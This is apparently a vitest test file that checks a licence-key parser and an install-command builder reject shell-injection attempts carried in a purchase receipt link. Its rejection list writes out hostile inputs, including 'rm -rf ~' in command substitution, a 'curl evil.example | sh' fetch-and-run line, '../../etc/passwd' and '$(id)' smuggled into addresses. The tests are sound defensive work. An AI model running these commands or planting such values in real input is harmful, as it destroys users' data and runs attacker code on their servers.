import { describe, expect, it } from "vitest"

import { installCommand, parseLicenseKey } from "./installCommand"

/**
 * The install command is pasted into a root shell, so nothing but a licence key
 * in the backend's own form may ever reach it.
 *
 * WHY THIS EXISTS. The purchase receipt built the command from the `key` in its
 * address, so /buy/success?key=$(rm -rf ~) printed a command that ran the
 * attacker's code on the buyer's server when they pasted it. These are the
 * shapes such a link takes.
 */

const KEY = "3f2b8c1e-9a4d-4e6f-8b7a-1c2d3e4f5a6b"
const BASE = "https://backend.onemana.dev"

const NOT_KEYS = [
  "",
  "$(rm -rf ~)",
  '";rm -rf ~;"',
  "`id`",
  `${KEY};id`,
  `${KEY}$(id)`,
  `${KEY}"); curl evil.example | sh; ("`,
  `${KEY}\n`,
  ` ${KEY}`,
  "../../etc/passwd",
  // Forms the backend's uuid.Parse would accept, but that our API never sends.
  `{${KEY}}`,
  `urn:uuid:${KEY}`,
  KEY.replace(/-/g, ""),
  KEY.toUpperCase(),
]

describe("a licence key", () => {
  it("is accepted exactly as the backend issues it", () => {
    expect(parseLicenseKey(KEY)).toBe(KEY)
  })

  it("is refused in any other shape, including every injection attempt", () => {
    for (const bad of NOT_KEYS) expect(parseLicenseKey(bad), JSON.stringify(bad)).toBeNull()
    for (const notString of [undefined, null, 42, {}, [KEY]]) expect(parseLicenseKey(notString)).toBeNull()
  })
})

describe("the install command", () => {
  it("is the backend's own wording, for this key", () => {
    // portalBusiness.go installCommand writes the same line into emails and the
    // account page; a buyer comparing the two should see the same command.
    expect(installCommand(KEY, BASE)).toBe(`/bin/bash -c "$(curl -fsSL ${BASE}/onecamp/download/${KEY})"`)
  })

  it("is not built at all from anything that is not a key", () => {
    for (const bad of NOT_KEYS) expect(installCommand(bad, BASE), JSON.stringify(bad)).toBeNull()
  })

  it("is not built from a backend address that could carry shell syntax", () => {
    for (const base of ['https://x.example"', "https://x.example/$(id)", "https://x.example a", "javascript:alert(1)", ""]) {
      expect(installCommand(KEY, base), base).toBeNull()
    }
    expect(installCommand(KEY, "http://localhost:8080")).toContain("http://localhost:8080/onecamp/download/")
  })
})
